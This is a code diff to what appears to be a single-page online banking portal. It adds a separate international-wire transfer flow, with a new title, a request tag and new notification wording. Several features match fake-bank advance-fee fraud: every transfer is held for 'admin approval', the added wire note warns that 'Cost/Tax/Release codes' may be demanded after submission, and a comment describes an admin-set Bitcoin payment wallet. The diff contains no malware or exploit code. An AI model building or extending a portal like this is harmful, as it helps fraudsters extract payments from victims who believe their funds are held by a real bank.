@@ -316,11 +316,11 @@ footer{background:var(--white);border-top:1px solid var(--border);padding:14px 2
     </a>
 
     <div class="nav-section">Transfers</div>
-    <a class="nav-item" href="#" onclick="openModal('modal-transfer');closeSidebar()">
+    <a class="nav-item" href="#" onclick="openTransferModal('local');closeSidebar()">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
       Local Transfer
     </a>
-    <a class="nav-item" href="#" onclick="openModal('modal-transfer');closeSidebar()">
+    <a class="nav-item" href="#" onclick="openTransferModal('international');closeSidebar()">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
       International Wire
     </a>
@@ -492,7 +492,7 @@ footer{background:var(--white);border-top:1px solid var(--border);padding:14px 2
               <div class="action-label">Transactions</div>
               <div class="action-sub">View history</div>
             </div>
-            <div class="action-card ac-green" onclick="openModal('modal-transfer')">
+            <div class="action-card ac-green" onclick="openTransferModal('local')">
               <div class="action-icon">📤</div>
               <div class="action-label">Send Money</div>
               <div class="action-sub">Transfer funds</div>
@@ -771,11 +771,11 @@ footer{background:var(--white);border-top:1px solid var(--border);padding:14px 2
 <!-- Transfer Modal -->
 <div class="modal-overlay" id="modal-transfer">
   <div class="modal">
-    <div class="modal-header"><div class="modal-title">📤 Send Transfer</div><button class="modal-close" onclick="closeModal('modal-transfer')">✕</button></div>
+    <div class="modal-header"><div class="modal-title" id="tf-title">📤 Send Transfer</div><button class="modal-close" onclick="closeModal('modal-transfer')">✕</button></div>
     <div class="modal-body">
       <div class="alert alert-err" id="tf-err"></div>
       <div class="alert alert-ok" id="tf-ok"></div>
-      <div class="info-note">⏳ All transfers require admin approval before funds are released.</div>
+      <div class="info-note" id="tf-kind-note">⏳ All transfers require admin approval before funds are released.</div>
       <div class="form-group"><label class="form-label">Recipient Full Name</label><input class="form-input" type="text" id="tf-name" placeholder="John Smith"></div>
       <div class="form-group"><label class="form-label">Recipient Account / IBAN</label><input class="form-input" type="text" id="tf-account" placeholder="Account number or IBAN"></div>
       <div class="form-group"><label class="form-label">Bank Name</label><input class="form-input" type="text" id="tf-bank" placeholder="Bank of America"></div>
@@ -870,6 +870,7 @@ const SUPA_KEY="sb_publishable_fidyxSk8eEyVTpM_JCMjSA_xz4OQ6_C";
 const sb=supabase.createClient(SUPA_URL,SUPA_KEY);
 let userId=null,userProfile=null,allTxns=[];
 let wfPendingAmount=null, wfPendingLabel='';
+let transferKind='local'; // 'local' or 'international' — which sidebar link opened modal-transfer
 
 // Bitcoin wallet is set by admin in the DB (payment_methods table, migration 011;
 // surface via the get_active_payment_methods RPC). The constant below is the safe
@@ -1067,6 +1068,22 @@ async function saveProfile(){
   location.reload();
 }
 
+function openTransferModal(kind){
+  transferKind = kind === 'international' ? 'international' : 'local';
+  const title = document.getElementById('tf-title');
+  const note = document.getElementById('tf-kind-note');
+  if (transferKind === 'international') {
+    if (title) title.textContent = '🌐 International Wire Transfer';
+    if (note) note.textContent = '⏳ International wires require admin approval. If your account requires Cost/Tax/Release codes, you\'ll be asked for them after you submit.';
+  } else {
+    if (title) title.textContent = '📤 Send Transfer';
+    if (note) note.textContent = '⏳ All transfers require admin approval before funds are released.';
+  }
+  document.getElementById('tf-err').style.display='none';
+  document.getElementById('tf-ok').style.display='none';
+  openModal('modal-transfer');
+}
+
 async function doTransfer(){
   const name=document.getElementById('tf-name').value.trim();
   const account=document.getElementById('tf-account').value.trim();
@@ -1094,13 +1111,15 @@ async function doTransfer(){
     return;
   }
   setLoading('tf-btn',true,'Submitting...');
-  const{error}=await sb.from('transfer_requests').insert({user_id:userId,amount,recipient_name:name,recipient_account:account,bank_name:bank,reason});
+  const isWire=transferKind==='international';
+  const taggedReason=(isWire?'[International Wire] ':'')+reason;
+  const{error}=await sb.from('transfer_requests').insert({user_id:userId,amount,recipient_name:name,recipient_account:account,bank_name:bank,reason:taggedReason,note:isWire?'International wire':'Local transfer'});
   setLoading('tf-btn',false,'Submit Request');
   if(error){showAlert('tf-err',error.message);return;}
-  showAlert('tf-ok','Transfer request submitted! Awaiting admin approval.');
-  sendNotifications('transfer', 'Transfer Request Submitted', 'Your transfer request was submitted and is awaiting admin approval.');
-  sendInboxMail('Transfer Request Submitted — $' + amount.toFixed(2),
-    'Your transfer request has been received and is pending admin approval.\n\n' +
+  showAlert('tf-ok',(isWire?'International wire request':'Transfer request')+' submitted! Awaiting admin approval.');
+  sendNotifications('transfer', (isWire?'International Wire':'Transfer')+' Request Submitted', 'Your '+(isWire?'international wire':'transfer')+' request was submitted and is awaiting admin approval.');
+  sendInboxMail((isWire?'International Wire':'Transfer')+' Request Submitted — $' + amount.toFixed(2),
+    'Your '+(isWire?'international wire':'transfer')+' request has been received and is pending admin approval.\n\n' +
     '  • Amount: $'+amount.toFixed(2)+'\n' +
     '  • Recipient: '+name+'\n' +
     '  • Account/IBAN: '+account+'\n' +
